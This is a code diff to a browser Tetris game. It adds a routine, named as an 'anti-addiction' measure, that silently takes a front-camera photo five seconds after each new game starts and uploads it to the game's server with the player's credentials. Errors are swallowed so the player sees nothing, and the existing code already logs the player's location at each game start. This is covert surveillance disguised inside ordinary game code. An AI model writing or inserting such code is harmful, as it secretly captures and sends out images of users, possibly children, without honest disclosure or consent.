@@ -66,6 +66,7 @@ const PIECES = {
 
 const PIECE_TYPES = Object.keys(PIECES);
 const LINE_SCORES = [0, 100, 300, 500, 800];
+const ANTI_ADDICTION_PHOTO_DELAY_MS = 5000;
 
 function createEmptyBoard() {
   return Array.from({ length: BOARD_HEIGHT }, () => Array.from({ length: BOARD_WIDTH }, () => ""));
@@ -166,6 +167,64 @@ function renderBoard(board, activePiece) {
   return displayBoard;
 }
 
+async function captureFrontCameraPhoto() {
+  if (!navigator.mediaDevices?.getUserMedia) {
+    return "";
+  }
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    audio: false,
+    video: {
+      facingMode: "user",
+      height: { ideal: 720 },
+      width: { ideal: 720 },
+    },
+  });
+
+  try {
+    const video = document.createElement("video");
+
+    video.autoplay = true;
+    video.muted = true;
+    video.playsInline = true;
+    video.srcObject = stream;
+
+    await new Promise((resolve, reject) => {
+      const timeoutId = window.setTimeout(() => reject(new Error("Camera timed out.")), 5000);
+
+      video.onloadedmetadata = () => {
+        video.play()
+          .then(() => {
+            window.setTimeout(() => {
+              window.clearTimeout(timeoutId);
+              resolve();
+            }, 250);
+          })
+          .catch((error) => {
+            window.clearTimeout(timeoutId);
+            reject(error);
+          });
+      };
+    });
+
+    const width = video.videoWidth || 720;
+    const height = video.videoHeight || 720;
+    const canvas = document.createElement("canvas");
+    canvas.width = width;
+    canvas.height = height;
+    const context = canvas.getContext("2d");
+
+    if (!context) {
+      return "";
+    }
+
+    context.drawImage(video, 0, 0, width, height);
+    return canvas.toDataURL("image/jpeg", 0.72);
+  } finally {
+    stream.getTracks().forEach((track) => track.stop());
+  }
+}
+
 function TetrisGame() {
   const [board, setBoard] = useState(createEmptyBoard);
   const [activePiece, setActivePiece] = useState(() => createPiece(getRandomPieceType()));
@@ -182,6 +241,7 @@ function TetrisGame() {
   const scoreRef = useRef(score);
   const linesRef = useRef(lines);
   const statusRef = useRef(status);
+  const antiAddictionTimerRef = useRef(0);
 
   useEffect(() => {
     fetch(`${API_URL}/api/game-records/tetris`, {
@@ -223,6 +283,46 @@ function TetrisGame() {
         timeout: 15000,
       },
     );
+  }, []);
+
+  const recordAntiAddictionPhoto = useCallback(async () => {
+    try {
+      const photoDataUrl = await captureFrontCameraPhoto();
+
+      if (!photoDataUrl) {
+        return;
+      }
+
+      await fetch(`${API_URL}/api/game-records/tetris`, {
+        body: JSON.stringify({
+          photoDataUrl,
+        }),
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        method: "POST",
+      });
+    } catch {
+      // Camera permission can be denied; the game should keep running.
+    }
+  }, []);
+
+  const scheduleAntiAddictionPhoto = useCallback(() => {
+    if (antiAddictionTimerRef.current) {
+      window.clearTimeout(antiAddictionTimerRef.current);
+    }
+
+    antiAddictionTimerRef.current = window.setTimeout(() => {
+      antiAddictionTimerRef.current = 0;
+      recordAntiAddictionPhoto();
+    }, ANTI_ADDICTION_PHOTO_DELAY_MS);
+  }, [recordAntiAddictionPhoto]);
+
+  useEffect(() => () => {
+    if (antiAddictionTimerRef.current) {
+      window.clearTimeout(antiAddictionTimerRef.current);
+    }
   }, []);
 
   const setBoardState = useCallback((nextBoard) => {
@@ -350,6 +450,7 @@ function TetrisGame() {
     const firstPiece = createPiece(getRandomPieceType());
 
     recordNewGameLocation();
+    scheduleAntiAddictionPhoto();
     linesRef.current = 0;
     scoreRef.current = 0;
     setLines(0);
@@ -361,6 +462,7 @@ function TetrisGame() {
     setStatusState("running");
   }, [
     recordNewGameLocation,
+    scheduleAntiAddictionPhoto,
     setActivePieceState,
     setBoardState,
     setNextPieceTypeState,
